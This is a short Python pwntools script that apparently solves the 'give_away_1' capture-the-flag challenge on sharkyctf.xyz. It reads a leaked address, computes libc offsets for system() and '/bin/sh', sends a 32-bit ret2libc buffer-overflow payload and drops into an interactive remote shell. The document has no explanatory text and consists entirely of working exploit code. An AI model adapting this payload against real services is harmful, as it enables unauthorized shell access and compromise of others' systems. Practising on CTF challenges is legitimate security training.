#!/usr/bin/env python
from pwn import * 
import sys

context(arch="i386")
#e = ELF("./give_away_1")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc = ELF("libc-2.27.so")

#p = e.process()
p = remote('sharkyctf.xyz', 20334)
system = libc.symbols['system']
print hex(system)

p.recvuntil('Give away: ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)

sh = libc.search('/bin/sh\x00').next()
print hex(sh)
 
libcBase = stackAddr - system
sysAddr = libcBase + system
binsh = libcBase + sh
 
print hex(libcBase)
print hex(sysAddr)
print hex(binsh)
 

exploit = "A"* (40 - len(p32(sysAddr)))
exploit += p32(sysAddr)
exploit += 'BBBB'
exploit += p32(binsh)

print exploit

p.sendline(exploit)
p.interactive()
